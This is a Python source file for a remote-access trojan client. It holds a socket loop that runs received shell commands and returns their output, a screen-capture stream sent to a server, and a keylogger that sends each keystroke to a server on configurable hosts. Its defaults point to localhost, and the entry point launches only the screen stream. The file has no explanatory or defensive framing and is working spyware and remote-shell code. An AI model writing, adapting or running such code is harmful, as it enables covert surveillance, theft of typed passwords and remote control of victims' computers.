import socket
import subprocess
import cv2
import pickle
import struct
import pyautogui
import numpy as np
from pynput import keyboard

def interact_with_server(client_socket):
    try:
        while True:
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break

            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            client_socket.send(output.stdout.encode('utf-8') + output.stderr.encode('utf-8'))
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        client_socket.close()

def start_video_stream_client(host='127.0.0.1', port=9999):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    print(f"Connected to video stream server at {host}:{port}")

    try:
        while True:
            # Capture the screen
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            # Encode the frame
            encoded, buffer = cv2.imencode('.jpg', frame)
            data = pickle.dumps(buffer)
            message_size = struct.pack("L", len(data))
            
            client_socket.sendall(message_size + data)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

def start_keylogger_client(host='127.0.0.1', port=9998):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    print(f"Connected to keylogger server at {host}:{port}")

    def on_press(key):
        try:
            key_data = str(key.char)
        except AttributeError:
            key_data = str(key)
        client_socket.send(key_data.encode('utf-8'))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    client_socket.close()

if __name__ == "__main__":
    start_video_stream_client()
